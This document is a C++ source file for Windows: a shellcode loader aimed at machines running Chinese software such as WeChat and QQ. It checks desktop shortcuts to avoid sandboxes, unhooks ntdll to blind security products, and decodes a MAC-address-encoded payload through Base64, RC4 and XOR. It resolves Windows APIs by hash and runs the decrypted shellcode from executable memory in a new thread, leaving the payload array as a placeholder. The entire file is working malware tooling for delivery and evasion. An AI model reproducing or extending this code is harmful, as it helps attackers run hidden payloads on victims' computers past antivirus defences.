#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <string>
#include <vector>
#include <io.h>
#include <fcntl.h>
#include <stdio.h>
#include <winternl.h>
#include <psapi.h>

#pragma warning(disable:4996)

typedef LPVOID(WINAPI* VirtualAllocPtr)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* VirtualProtectPtr)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateThreadPtr)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI* WaitForSingleObjectPtr)(HANDLE, DWORD);

typedef struct { unsigned char S[256]; int i, j; } RC4State;
void InitRC4(RC4State* state, const unsigned char* key, size_t key_len);
void DecryptRC4(RC4State* state, unsigned char* data, size_t len);
void DecryptXOR(unsigned char* data, size_t len, unsigned char key);
unsigned char* MacToData(const char** mac_array, size_t* data_len);
unsigned char* DecodeBase64(const char* encoded, size_t* decoded_len);
int CountFiles(const std::wstring& path);
bool FileExists(const std::wstring& path);
bool FindShortcut(const std::wstring& desktop_path, const std::vector<std::wstring>& names);
DWORD UnhookNtdll();
DWORD CalcHash(const char* str);
FARPROC GetApiByHash(HMODULE module, DWORD target_hash);

int main() {
    _setmode(_fileno(stdout), _O_U16TEXT);
    _setmode(_fileno(stdin), _O_U16TEXT);

    std::vector<std::pair<std::wstring, std::vector<std::wstring>>> software_list = {
        {L"WeChat", {L"WeChat.lnk", L"wechat.lnk", L"WeChatApp.lnk"}},
        {L"QQ", {L"QQ.lnk", L"TencentQQ.lnk", L"TIM.lnk"}},
        {L"BaiduCloud", {L"BaiduCloud.lnk", L"BaiduNetdisk.lnk", L"BaiduYun.lnk"}},
        {L"WPSOffice", {L"WPSOffice.lnk", L"WPS.lnk", L"WPS2023.lnk"}}
    };

    wchar_t user_desktop[MAX_PATH], public_desktop[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, user_desktop);
    SHGetFolderPathW(NULL, CSIDL_COMMON_DESKTOPDIRECTORY, NULL, 0, public_desktop);

    int total_files = CountFiles(user_desktop) + CountFiles(public_desktop);
    int found_count = 0;
    for (const auto& software : software_list) {
        if (FindShortcut(user_desktop, software.second) || FindShortcut(public_desktop, software.second)) {
            ++found_count;
        }
    }

    int score = std::min(found_count * 20 + (total_files > 15 ? 20 : 0), 100);
    std::wcout << L"Environment score: " << score << L"%\n";
    if (score <= 40) {
        std::wcout << L"Score too low, exiting\n";
        return 0;
    }

    std::wcout << L"Unhooking ntdll...\n";
    if (DWORD result = UnhookNtdll()) {
        std::wcout << L"Unhook failed, error: " << result << L"\n";
    } else {
        std::wcout << L"Unhook successful\n";
    }

    const char* mac_shellcode[] = { /* Replace with encoded MAC array */ nullptr };
    const unsigned char rc4_key[] = "MySecret";
    const unsigned char xor_key = 0xAB;

    std::wcout << L"\n=== Decrypting Shellcode ===\n";
    size_t base64_len;
    unsigned char* base64_data = MacToData(mac_shellcode, &base64_len);
    if (!base64_data) {
        std::wcout << L"MAC conversion failed\n";
        return -1;
    }
    std::wcout << L"1. MAC to Base64 done (" << base64_len << L" bytes)\n";

    size_t shellcode_len;
    unsigned char* shellcode_data = DecodeBase64((const char*)base64_data, &shellcode_len);
    free(base64_data);
    if (!shellcode_data) {
        std::wcout << L"Base64 decoding failed\n";
        return -1;
    }
    std::wcout << L"2. Base64 decoded (" << shellcode_len << L" bytes)\n";

    RC4State state;
    InitRC4(&state, rc4_key, strlen((const char*)rc4_key));
    DecryptRC4(&state, shellcode_data, shellcode_len);
    std::wcout << L"3. RC4 decryption done\n";

    DecryptXOR(shellcode_data, shellcode_len, xor_key);
    std::wcout << L"4. XOR decryption done (" << shellcode_len << L" bytes)\n";

    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    if (!kernel32) {
        std::wcout << L"Failed to get kernel32.dll\n";
        free(shellcode_data);
        return -1;
    }

    DWORD HASH_VA = 0xDF894B12, HASH_VP = 0x77E9F7C8, HASH_CT = 0x26662FCC, HASH_WFSO = 0xB93BC4D5;
    VirtualAllocPtr alloc = (VirtualAllocPtr)GetApiByHash(kernel32, HASH_VA);
    VirtualProtectPtr protect = (VirtualProtectPtr)GetApiByHash(kernel32, HASH_VP);
    CreateThreadPtr create_thread = (CreateThreadPtr)GetApiByHash(kernel32, HASH_CT);
    WaitForSingleObjectPtr wait = (WaitForSingleObjectPtr)GetApiByHash(kernel32, HASH_WFSO);

    if (!alloc || !protect || !create_thread || !wait) {
        std::wcout << L"API resolution failed\n";
        free(shellcode_data);
        return -1;
    }

    if (shellcode_len == 0) {
        std::wcout << L"Empty shellcode, exiting\n";
        free(shellcode_data);
        return 0;
    }

    LPVOID mem = alloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        std::wcout << L"Memory allocation failed\n";
        free(shellcode_data);
        return -1;
    }

    memcpy(mem, shellcode_data, shellcode_len);
    DWORD thread_id;
    HANDLE thread = create_thread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, &thread_id);
    if (!thread) {
        std::wcout << L"Thread creation failed\n";
        VirtualFree(mem, 0, MEM_RELEASE);
        free(shellcode_data);
        return -1;
    }

    wait(thread, INFINITE);
    CloseHandle(thread);
    VirtualFree(mem, 0, MEM_RELEASE);
    free(shellcode_data);
    return 0;
}

unsigned char* MacToData(const char** mac_array, size_t* data_len) {
    size_t count = 0;
    while (mac_array[count]) ++count;
    *data_len = count * 6;
    unsigned char* data = (unsigned char*)malloc(*data_len);
    if (!data) return nullptr;

    for (size_t i = 0; i < count; ++i) {
        sscanf(mac_array[i], "%02hhx-%02hhx-%02hhx-%02hhx-%02hhx-%02hhx",
            &data[i * 6], &data[i * 6 + 1], &data[i * 6 + 2],
            &data[i * 6 + 3], &data[i * 6 + 4], &data[i * 6 + 5]);
    }
    return data;
}

unsigned char* DecodeBase64(const char* encoded, size_t* decoded_len) {
    const char b64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t len = strlen(encoded);
    *decoded_len = (len / 4) * 3;
    if (encoded[len - 1] == '=') (*decoded_len)--;
    if (encoded[len - 2] == '=') (*decoded_len)--;

    unsigned char* decoded = (unsigned char*)malloc(*decoded_len);
    if (!decoded) return nullptr;

    for (size_t i = 0, j = 0; i < len; ) {
        int a = strchr(b64_chars, encoded[i++]) - b64_chars;
        int b = strchr(b64_chars, encoded[i++]) - b64_chars;
        int c = (encoded[i] == '=') ? 0 : strchr(b64_chars, encoded[i++]) - b64_chars;
        int d = (encoded[i] == '=') ? 0 : strchr(b64_chars, encoded[i++]) - b64_chars;
        decoded[j++] = (a << 2) | (b >> 4);
        if (j < *decoded_len) decoded[j++] = ((b & 0xF) << 4) | (c >> 2);
        if (j < *decoded_len) decoded[j++] = ((c & 0x3) << 6) | d;
    }
    return decoded;
}

void InitRC4(RC4State* state, const unsigned char* key, size_t key_len) {
    for (int i = 0; i < 256; ++i) state->S[i] = (unsigned char)i;
    int j = 0;
    for (int i = 0; i < 256; ++i) {
        j = (j + state->S[i] + key[i % key_len]) & 0xFF;
        unsigned char temp = state->S[i];
        state->S[i] = state->S[j];
        state->S[j] = temp;
    }
    state->i = state->j = 0;
}

void DecryptRC4(RC4State* state, unsigned char* data, size_t len) {
    for (size_t k = 0; k < len; ++k) {
        state->i = (state->i + 1) & 0xFF;
        state->j = (state->j + state->S[state->i]) & 0xFF;
        unsigned char temp = state->S[state->i];
        state->S[state->i] = state->S[state->j];
        state->S[state->j] = temp;
        data[k] ^= state->S[(state->S[state->i] + state->S[state->j]) & 0xFF];
    }
}

void DecryptXOR(unsigned char* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; ++i) data[i] ^= key;
}

int CountFiles(const std::wstring& path) {
    int count = 0;
    std::wstring search = path + L"\\*";
    WIN32_FIND_DATAW data;
    HANDLE find = FindFirstFileW(search.c_str(), &data);
    if (find != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(data.cFileName, L".") && wcscmp(data.cFileName, L"..") &&
                !(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                ++count;
            }
        } while (FindNextFileW(find, &data));
        FindClose(find);
    }
    return count;
}

bool FileExists(const std::wstring& path) {
    DWORD attr = GetFileAttributesW(path.c_str());
    return (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY));
}

bool FindShortcut(const std::wstring& desktop_path, const std::vector<std::wstring>& names) {
    for (const auto& name : names) {
        if (FileExists(desktop_path + L"\\" + name)) return true;
    }
    return false;
}

DWORD UnhookNtdll() {
    MODULEINFO mod_info = {};
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 1;

    GetModuleInformation(GetCurrentProcess(), ntdll, &mod_info, sizeof(mod_info));
    LPVOID ntdll_base = mod_info.lpBaseOfDll;

    HANDLE file = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (file == INVALID_HANDLE_VALUE) return 2;

    HANDLE mapping = CreateFileMapping(file, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!mapping) { CloseHandle(file); return 3; }

    LPVOID map_addr = MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
    if (!map_addr) { CloseHandle(mapping); CloseHandle(file); return 4; }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll_base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((ULONG_PTR)ntdll_base + dos->e_lfanew);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(nt) + i * IMAGE_SIZEOF_SECTION_HEADER);
        if (memcmp(sec->Name, ".text", 5) == 0) {
            DWORD old_prot;
            VirtualProtect((LPVOID)((ULONG_PTR)ntdll_base + sec->VirtualAddress), sec->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old_prot);
            memcpy((LPVOID)((ULONG_PTR)ntdll_base + sec->VirtualAddress), (LPVOID)((ULONG_PTR)map_addr + sec->VirtualAddress), sec->Misc.VirtualSize);
            VirtualProtect((LPVOID)((ULONG_PTR)ntdll_base + sec->VirtualAddress), sec->Misc.VirtualSize, old_prot, &old_prot);
        }
    }

    UnmapViewOfFile(map_addr);
    CloseHandle(mapping);
    CloseHandle(file);
    return 0;
}

DWORD CalcHash(const char* str) {
    DWORD hash = 0;
    while (*str) hash = ((hash << 5) + hash) + *str++;
    return hash;
}

FARPROC GetApiByHash(HMODULE module, DWORD target_hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)module + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)module +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* names = (DWORD*)((BYTE*)module + export_dir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)module + export_dir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((BYTE*)module + export_dir->AddressOfFunctions);

    for (DWORD i = 0; i < export_dir->NumberOfNames; ++i) {
        char* fname = (char*)((BYTE*)module + names[i]);
        if (CalcHash(fname) == target_hash) {
            return (FARPROC)((BYTE*)module + functions[ordinals[i]]);
        }
    }
    return nullptr;
}